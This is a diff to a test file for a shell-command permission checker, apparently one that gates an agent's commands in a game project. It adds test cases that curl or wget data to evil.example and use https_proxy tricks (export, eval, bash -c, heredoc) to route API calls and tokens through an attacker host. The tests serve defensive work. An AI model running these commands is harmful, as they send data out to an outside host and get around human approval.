@@ -246,6 +246,14 @@ const MUST_ASK = {
     "curl -d x http://localhost:80@evil.example/",
     "curl -d x evil.example",
     `wget -i urls.txt --post-data x "$IDLEBIZ_API_URL/v1/message-team"`,
+    // A setting outside the fetch's words reroutes it wherever the shell reads it, though a body says the same words.
+    `export https_proxy=http://evil.example; curl -d '{"a":1}' "$IDLEBIZ_API_URL/v1/message-team"`,
+    `eval 'export https_proxy=http://evil.example'; curl -d 'export https_proxy=http://evil.example' "$IDLEBIZ_API_URL/v1/message-team"`,
+    `bash -c 'https_proxy=http://evil.example curl -d x "$IDLEBIZ_API_URL/v1/message-team"'`,
+    `bash <<EOF\nexport https_proxy=http://evil.example\ncurl -d x "$IDLEBIZ_API_URL/v1/message-team"\nEOF`,
+    `curl -d x -d 'https_proxy=http://evil.example' "$IDLEBIZ_API_URL/v1/message-team" https://evil.example`,
+    `"export https_proxy=http://evil.example; curl -d '{}' \\"$IDLEBIZ_API_URL/v1/message-team\\""`,
+    `https_proxy=$(curl -d 'https_proxy=' "$IDLEBIZ_API_URL/v1/x") curl -d x "$IDLEBIZ_API_URL/v1/message-team"`,
   ],
   payments: [
     "stripe charges create --amount 500",
@@ -360,6 +368,11 @@ const MUST_ALLOW = [
   // A URL in a tool's body is data the game reads, not where the curl sends.
   `curl -s -X POST "$IDLEBIZ_API_URL/v1/payment-link" -H "Authorization: Bearer $IDLEBIZ_RUN_TOKEN" -d '{"name":"x","amountUsd":5,"afterPaymentUrl":"https://game.vercel.app/unlock"}'`,
   `curl -s -X POST "$IDLEBIZ_API_URL/v1/message-team" -d '{"text":"Deployed: https://game.vercel.app"}'`,
+  // Words that would reroute a fetch are only data in a body the game's API reads.
+  `curl -s -X POST "$IDLEBIZ_API_URL/v1/message-team" -H 'content-type: application/json' -d '{"text":"added http_proxy=none to the docs"}'`,
+  `curl -s -X POST "$IDLEBIZ_API_URL/v1/delegate" -d '{"role":"engineer","description":"call the deploy tool at IDLEBIZ_API_URL/v1/deploy"}'`,
+  `curl -s -X POST "$IDLEBIZ_API_URL/v1/ask-boss" --json '{"question":"Set HTTPS_PROXY=http://proxy.corp:8080 and CURL_HOME in the CI?"}'`,
+  `"curl -s -X POST \\"$IDLEBIZ_API_URL/v1/message-team\\" -d '{\\"text\\":\\"proxy=on in dev\\"}'"`,
   `curl -s -X POST \${IDLEBIZ_API_URL}/v1/ask-boss -H 'Referer: https://x.example' -d '{"question":"Ship https://game.vercel.app?"}'`,
   `curl -s "$IDLEBIZ_API_URL/v1/team-chat" -H "Authorization: Bearer $IDLEBIZ_RUN_TOKEN" | python3 -c 'import json,sys; print(json.load(sys.stdin))'`,
   `curl -s -X POST http://localhost:3000/api/signup -d '{"next":"https://game.vercel.app"}'`,
